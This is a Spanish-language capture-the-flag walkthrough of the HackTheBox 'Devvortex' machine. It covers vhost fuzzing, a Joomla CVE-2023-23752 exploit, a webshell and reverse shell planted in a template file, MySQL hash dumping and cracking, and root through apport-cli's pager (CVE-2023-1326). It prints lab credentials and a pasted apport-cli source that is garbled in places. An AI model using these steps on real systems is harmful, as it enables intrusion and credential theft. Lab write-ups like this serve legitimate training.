# Devvortex

![](../../../../~gitbook/image.md)Publicado: 24 de Mayo de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
###📝 Descripción
Devvortex es una máquina Linux de dificultad Easy de HackTheBox que presenta un escenario realista de penetration testing enfocado en la explotación de un CMS Joomla vulnerable y técnicas de escalada de privilegios.La explotación comienza con el descubrimiento de virtual hosting mediante fuzzing de subdominios, revelando un subdominio de desarrollo (`dev.devvortex.htb`) que ejecuta una versión vulnerable de Joomla 4.2.6. Esta versión es susceptible a CVE-2023-23752, una vulnerabilidad de divulgación de información no autenticada que permite obtener credenciales de base de datos y usuarios del sistema.Una vez obtenidas las credenciales, se logra acceso al panel de administración de Joomla, desde donde se puede explotar un Remote Code Execution (RCE) mediante la modificación de plantillas PHP para ejecutar código malicioso y obtener una reverse shell.Para la escalada de privilegios horizontal, se utiliza el acceso a la base de datos MySQL para extraer hashes de contraseñas de usuarios, los cuales se crackan exitosamente para obtener acceso como el usuario `logan`.Finalmente, la escalada vertical a root se logra explotando CVE-2023-1326, una vulnerabilidad en `apport-cli` que permite escape de privilegios a través de la funcionalidad de visualización de reportes, ejecutando comandos como root desde el contexto del paginador.Esta máquina es ideal para practicar:- Enumeración de subdominios y virtual hosting
- Explotación de CMS (Joomla)
- Vulnerabilidades de divulgación de información
- Técnicas de RCE mediante modificación de archivos
- Cracking de hashes
- Escalada de privilegios mediante herramientas del sistema

###🔭 Reconocimiento

####Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
####Escaneo de puertos

####Enumeración de servicios
⚠️ Importante: Detectamos durante la fase de enumeración con nmap que se está realizando virtual hosting. Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
###🌐 Enumeración Web

####80 / TCP - devvortex.htb
![](../../../../~gitbook/image.md)Tras enumerar el sitio web no encontramos gran cosa ni nada que aparentemente nos puede dar un vector de ataque.
####🕷️Fuzzing de vhosts
Relizando fuzzing de vhosts encontramos un subdominio llamado dev que inmediatamente añadimos a nuestro fichero /etc/hosts![](../../../../~gitbook/image.md)
####80 / TCP - dev.devvortex.htb
![](../../../../~gitbook/image.md)
####🕷️Fuzzing de directorios
![](../../../../~gitbook/image.md)Enumeramos también el fichero robots.txt por si hubiese algún recurso adicional que no estuviese en el diccionario empleado durante el proceso de fuzzing:![](../../../../~gitbook/image.md)Hay un fichero README.txt mediante el cual podemos intuir que la versión de joomla empleada es la 4.2:http://dev.devvortex.htb/README.txt![](../../../../~gitbook/image.md)Encontramos algunos recursos interesantes, como por ejemplo un panel de administración que además nos permite enumerar que se está usando el CMS Joomla![](../../../../~gitbook/image.md)Dado que hemos confirmado de varias maneras que se está usando el CMS joomla, usamos la herramienta joomscan para ver si logramos enumerar algo más de información:![](../../../../~gitbook/image.md)
###💻 Explotación
La herramienta nos confirma que la versión de joomla que se está usando es la 4.2.6. Una pequeña búsqueda nos permite saber que versiones anteriores a la 4.2.8 incluida, presentan una vulnerabilidad de tipo Unauthenticated information disclosurehttps://github.com/Acceis/exploit-CVE-2023-23752Revisamos el contenido de uno de los exploits para enteder lo que hace y vemos que hay una ruta en la que se publican los usuarios que no debería ser accesible:![](../../../../~gitbook/image.md)Verificamos esto en nuestro host objetivo y logramos enumerar dos usuarios:http://dev.devvortex.htb/api/index.php/v1/users?public=true![](../../../../~gitbook/image.md)Lanzamos el exploit para ver qué es capaz de recuperar, pero antes debemos instalar algunas dependencias:Ejecutamos el exploit![](../../../../~gitbook/image.md)Obtenemos dos usuarios, (levis y logan) y la contraseña del usuario lewis para una base de datos mysql.La credencial no funciona con el servicio ssh para ninguno de los dos usuarios pero sí podemos autenticarnos en el panel de administración de Joomla con el usuario lewis![](../../../../~gitbook/image.md)Podemos intentar explotar un RCE usando alguna de las plantillas instaladas y usando la página error.php de la plantilla para inyectar una php webshell:![](../../../../~gitbook/image.md)Verificamos que la webshell que hemos subido funciona correctamente:![](../../../../~gitbook/image.md)Iniciamos un listener:Reemplazamos ahora el código de error.php de la template por una php reverse shell de pentestmonkey![](../../../../~gitbook/image.md)Relizamos la petición a error.php y ganamos acceso a la máquina:![](../../../../~gitbook/image.md)Vamos al usuario de logan e intentamos capturar la flag pero no tenemos permisos:
####Initial foothold
Buscamos la forma de escalar a usuario logan. Comprobamos que hay una base de datos mysql ejecutándose de forma local y tenemos las credenciales de lewis![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Nos quedamos con el hash de logan:Verificamos qué tipo de hash es usando la herramienta Name that hash:![](../../../../~gitbook/image.md)Usamos hascat y rockyou para intentar crackearlo:![](../../../../~gitbook/image.md)Nos autenticamos como logan y obtenemos la primera flag:
####👑 Escalada de privilegios
Ahora buscamos escalar privilegios a root:Tenemos permisos de ejecución y lectura sobre este archivo:![](../../../../~gitbook/image.md)Se trata de un script en python:Buscamos información de esta herramienta después de enumerar la versión y encontramos un exploit:![](../../../../~gitbook/image.md)https://github.com/diego-tella/CVE-2023-1326-PoCEl proceso es sencillo, ejecutamos la herramienta con la opción -c para indicar un archivo de bloqueo, después pulsamos V para visualizar el report y dentro de ese contexto ejecutamos una /bin/bash![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)
- [💻 Explotación](#explotacion)

```
❯  ping -c2 10.10.11.242
PING 10.10.11.242 (10.10.11.242) 56(84) bytes of data.
64 bytes from 10.10.11.242: icmp_seq=1 ttl=63 time=49.7 ms
64 bytes from 10.10.11.242: icmp_seq=2 ttl=63 time=45.5 ms

--- 10.10.11.242 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1005ms
rtt min/avg/max/mdev = 45.502/47.609/49.717/2.107 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.58  | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
22,80
```

```
nmap -sC -sV -p$ports 10.10.11.242 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-24 19:30 CEST
Nmap scan report for 10.10.11.242
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
echo "10.10.11.242 devvortex.htb" | sudo tee -a /etc/hosts
```

```
ffuf -u http://10.10.11.242 -H "Host: FUZZ.devvortex.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -mc all -fs 154
```

```
dirsearch -u http://dev.devvortex.htb -x 503
```

```

[19:47:57] 301 -   178B - /administrator  ->  http://dev.devvortex.htb/administrator/
[19:47:57] 200 -    31B - /administrator/cache/
[19:47:58] 301 -   178B - /administrator/logs  ->  http://dev.devvortex.htb/administrator/logs/
[19:47:58] 200 -    31B - /administrator/logs/
[19:47:58] 200 -   12KB - /administrator/
[19:47:58] 200 -   12KB - /administrator/index.php
[19:48:27] 301 -   178B - /cache  ->  http://dev.devvortex.htb/cache/
[19:48:27] 200 -    31B - /cache/
[19:48:27] 403 -    4KB - /cache/sql_error_latest.cgi
[19:48:33] 200 -    31B - /cli/
[19:48:37] 301 -   178B - /components  ->  http://dev.devvortex.htb/components/
[19:48:37] 200 -    31B - /components/
[19:48:41] 200 -     0B - /configuration.php
[19:49:07] 403 -   564B - /ext/.deps
[19:49:22] 200 -   23KB - /home
[19:49:23] 200 -    7KB - /htaccess.txt
[19:49:26] 200 -    31B - /images/
[19:49:26] 301 -   178B - /images  ->  http://dev.devvortex.htb/images/
[19:49:28] 301 -   178B - /includes  ->  http://dev.devvortex.htb/includes/
[19:49:28] 200 -    31B - /includes/
[19:49:29] 200 -   23KB - /index.php
[19:49:30] 200 -   23KB - /index.php.
[19:49:39] 301 -   178B - /language  ->  http://dev.devvortex.htb/language/
[19:49:39] 200 -    31B - /layouts/
[19:49:40] 301 -   178B - /libraries  ->  http://dev.devvortex.htb/libraries/
[19:49:40] 200 -    31B - /libraries/
[19:49:40] 200 -   18KB - /LICENSE.txt
[19:49:48] 403 -   564B - /mailer/.env
[19:49:52] 301 -   178B - /media  ->  http://dev.devvortex.htb/media/
[19:49:52] 200 -    31B - /media/
[19:49:58] 301 -   178B - /modules  ->  http://dev.devvortex.htb/modules/
[19:49:58] 200 -    31B - /modules/
[19:50:25] 301 -   178B - /plugins  ->  http://dev.devvortex.htb/plugins/
[19:50:25] 200 -    31B - /plugins/
[19:50:41] 200 -    5KB - /README.txt
[19:50:43] 403 -   564B - /resources/.arch-internal-preview.css
[19:50:43] 403 -   564B - /resources/sass/.sass-cache/
[19:50:44] 200 -   764B - /robots.txt
[19:51:12] 301 -   178B - /templates  ->  http://dev.devvortex.htb/templates/
[19:51:12] 200 -    31B - /templates/
[19:51:12] 200 -    31B - /templates/index.html
[19:51:12] 200 -     0B - /templates/system/
[19:51:16] 301 -   178B - /tmp  ->  http://dev.devvortex.htb/tmp/
[19:51:16] 200 -    31B - /tmp/
```

```
gem install httpx docopt paint
```

```
wget https://raw.githubusercontent.com/Acceis/exploit-CVE-2023-23752/refs/heads/master/exploit.rb
```

```
ruby exploit.rb http://dev.devvortex.htb
```

```
lewis:P4ntherg0t1n5r3c0n##
```

```
curl -s http://dev.devvortex.htb/templates/cassiopeia/error.php?pwn=whoami
```

```
nc -nlvp 1234
```

```
curl -s http://dev.devvortex.htb/templates/cassiopeia/error.php
```

```
www-data@devvortex:/home/logan$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
www-data@devvortex:/home/logan$
```

```
mysql -u lewis -h localhost -p
P4ntherg0t1n5r3c0n##

show databases;
use joomla;
show tables;
select * from sd4fg_users ;
```

```
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

```
nth --text '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
```

```
hashcat -m 3200 logan_hash /usr/share/wordlists/rockyou.txt
```

```
logan:tequieromucho
```

```
www-data@devvortex:/home/logan$ su logan
Password:
logan@devvortex:~$ whoami
logan
logan@devvortex:~$ cat /home/logan/user.txt
c149d*************************
```

```
logan@devvortex:~$ sudo -l
[sudo] password for logan:
Matching Defaults entries for logan on devvortex:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
(ALL : ALL) /usr/bin/apport-cli
logan@devvortex:~$
```

```
#!/usr/bin/python3

'''Command line Apport user interface.'''

# Copyright (C) 2007 - 2009 Canonical Ltd.
# Author: Michael Hofmann
#
# This program is free software; you can redistribute it and/or modify it
# under the terms of the GNU General Public License as published by the
# Free Software Foundation; either version 2 of the License, or (at your
# option) any later version.  See http://www.gnu.org/copyleft/gpl.html for
# the full text of the license.

# Web browser support:
#    w3m, lynx: do not work
#    elinks: works

from __future__ import unicode_literals

import os.path, os, sys, subprocess, re, errno
import termios, tempfile

from apport import unicode_gettext as _
import apport.ui

class CLIDialog:
'''Command line dialog wrapper.'''

def __init__(self, heading, text):
self.heading = '\n*** ' + heading + '\n'
self.text = text
self.keys = []
self.buttons = []
self.visible = False

def raw_input_char(self, prompt, multi_char=False):
'''raw_input, but read a single character unless multi_char is True.

@param: prompt: the text presented to the user to solict a response.
@param: multi_char: Boolean True if we need to read until .
'''

sys.stdout.write(prompt)
sys.stdout.write(' ')
sys.stdout.flush()

file = sys.stdin.fileno()
saved_attributes = termios.tcgetattr(file)
attributes = termios.tcgetattr(file)
attributes[3] = attributes[3] & ~(termios.ICANON)
attributes[6][termios.VMIN] = 1
attributes[6][termios.VTIME] = 0
termios.tcsetattr(file, termios.TCSANOW, attributes)
try:
if multi_char:
response = str(sys.stdin.readline()).strip()
else:
response = str(sys.stdin.read(1))
finally:
termios.tcsetattr(file, termios.TCSANOW, saved_attributes)

sys.stdout.write('\n')
return response

def show(self):
self.visible = True
print(self.heading)
if self.text:
print(self.text)

def run(self, prompt=None):
if not self.visible:
self.show()

sys.stdout.write('\n')
try:
# Only one button
if len(self.keys) = max_show:
s = _('(%i bytes)') % keylen
else:
s = _('(binary data)')

if isinstance(s, bytes):
s = s.decode('UTF-8', errors='ignore')
details += s
details += '\n\n'

return details

def ui_update_view(self):
self.in_update_view = True
report = self._get_details()
try:
p = subprocess.Popen(['/usr/bin/sensible-pager'], stdin=subprocess.PIPE)
p.communicate(report.encode('UTF-8'))
except IOError as e:
# ignore broken pipe (premature quit)
if e.errno == errno.EPIPE:
pass
else:
raise
self.in_update_view = False

#
# ui_* implementation of abstract UserInterface classes
#

def ui_present_report_details(self, allowed_to_report=True, modal_for=None):
dialog = CLIDialog(_('Send problem report to the developers?'),
_('After the problem report has been sent, please fill out the form in the\n'
'automatically opened web browser.'))

complete = dialog.addbutton(_('&Send report (%s)') %
self.format_filesize(self.get_complete_size()))

if self.can_examine_locally():
examine = dialog.addbutton(_('&Examine locally'))
else:
examine = None

view = dialog.addbutton(_('&View report'))
save = dialog.addbutton(_('&Keep report file for sending later or copying to somewhere else'))
ignore = dialog.addbutton(_('Cancel and &ignore future crashes of this program version'))

dialog.addbutton(_('&Cancel'))

while True:
response = dialog.run()

return_value = {'restart': False, 'blacklist': False, 'remember': False,
'report': False, 'examine': False}
if response == examine:
return_value['examine'] = True
return return_value
elif response == complete:
return_value['report'] = True
elif response == ignore:
return_value['blacklist'] = True
elif response == view:
self.collect_info()
self.ui_update_view()
continue
elif response == save:
# we do not already have a report file if we report a bug
if not self.report_file:
prefix = 'apport.'
if 'Package' in self.report:
prefix += self.report['Package'].split()[0] + '.'
(fd, self.report_file) = tempfile.mkstemp(prefix=prefix, suffix='.apport')
with os.fdopen(fd, 'wb') as f:
self.report.write(f)

print(_('Problem report file:') + ' ' + self.report_file)

return return_value

def ui_info_message(self, title, text):
dialog = CLIDialog(title, text)
dialog.addbutton(_('&Confirm'))
dialog.run()

def ui_error_message(self, title, text):
dialog = CLIDialog(_('Error: %s') % title, text)
dialog.addbutton(_('&Confirm'))
dialog.run()

def ui_start_info_collection_progress(self):
self.progress = CLIProgressDialog(
_('Collecting problem information'),
_('The collected information can be sent to the developers to improve the\n'
'application. This might take a few minutes.'))
self.progress.show()

def ui_pulse_info_collection_progress(self):
self.progress.set()

def ui_stop_info_collection_progress(self):
sys.stdout.write('\n')

def ui_start_upload_progress(self):
self.progress = CLIProgressDialog(
_('Uploading problem information'),
_('The collected information is being sent to the bug tracking system.\n'
'This might take a few minutes.'))
self.progress.show()

def ui_set_upload_progress(self, progress):
self.progress.set(progress)

def ui_stop_upload_progress(self):
sys.stdout.write('\n')

def ui_question_yesno(self, text):
'''Show a yes/no question.

Return True if the user selected "Yes", False if selected "No" or
"None" on cancel/dialog closing.
'''
dialog = CLIDialog(text, None)
r_yes = dialog.addbutton('&Yes')
r_no = dialog.addbutton('&No')
r_cancel = dialog.addbutton(_('&Cancel'))
result = dialog.run()
if result == r_yes:
return True
if result == r_no:
return False
assert result == r_cancel
return None

def ui_question_choice(self, text, options, multiple):
'''Show an question with predefined choices.

options is a list of strings to present. If multiple is True, they
should be check boxes, if multiple is False they should be radio
buttons.

Return list of selected option indexes, or None if the user cancelled.
If multiple == False, the list will always have one element.
'''
result = []
dialog = CLIDialog(text, None)

if multiple:
while True:
dialog = CLIDialog(text, None)
index = 0
choice_index_map = {}
for option in options:
if index not in result:
choice_index_map[dialog.addbutton(option, str(index + 1))] = index
index += 1
done = dialog.addbutton(_('&Done'))
cancel = dialog.addbutton(_('&Cancel'))

if result:
cur = ', '.join([str(r + 1) for r in result])
else:
cur = _('none')
response = dialog.run(_('Selected: %s. Multiple choices:') % cur)
if response == cancel:
return None
if response == done:
break
result.append(choice_index_map[response])

else:
# single choice (radio button)
dialog = CLIDialog(text, None)
index = 1
for option in options:
dialog.addbutton(option, str(index))
index += 1

cancel = dialog.addbutton(_('&Cancel'))
response = dialog.run(_('Choices:'))
if response == cancel:
return None
result.append(response - 1)

return result

def ui_question_file(self, text):
'''Show a file selector dialog.

Return path if the user selected a file, or None if cancelled.
'''
print('\n***  ' + text)
while True:
sys.stdout.write(_('Path to file (Enter to cancel):'))
sys.stdout.write(' ')
f = sys.stdin.readline().strip()
if not f:
return None
if not os.path.exists(f):
print(_('File does not exist.'))
elif os.path.isdir(f):
print(_('This is a directory.'))
else:
return f

def open_url(self, url):
text = '%s\n\n  %s\n\n%s' % (
_('To continue, you must visit the following URL:'),
url,
_('You can launch a browser now, or copy this URL into a browser on another computer.'))

answer = self.ui_question_choice(text, [_('Launch a browser now')], False)
if answer == [0]:
apport.ui.UserInterface.open_url(self, url)

def ui_run_terminal(self, command):
# we are already running in a terminal, so this works by definition
if not command:
return True

subprocess.call(command, shell=True)

if __name__ == '__main__':
app = CLIUserInterface()
if not app.run_argv():
print(_('No pending crash reports. Try --help for more information.'))
```

```
sudo /usr/bin/apport-cli --file-bug
Seleccionamos por ejemplo la Opción 4
press V (view report)

!/bin/bash
```
